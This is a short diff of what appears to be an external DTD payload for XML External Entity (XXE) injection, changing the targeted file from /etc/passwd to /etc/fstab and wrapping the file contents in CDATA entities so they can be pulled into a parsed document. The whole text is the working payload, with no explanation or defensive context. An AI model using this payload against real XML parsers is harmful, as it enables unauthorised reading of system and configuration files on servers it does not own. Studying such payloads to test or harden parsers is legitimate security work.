@@ -1,4 +1,4 @@
-<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///etc/fstab">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY Contents '%start;%data;%end;'>">
+<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
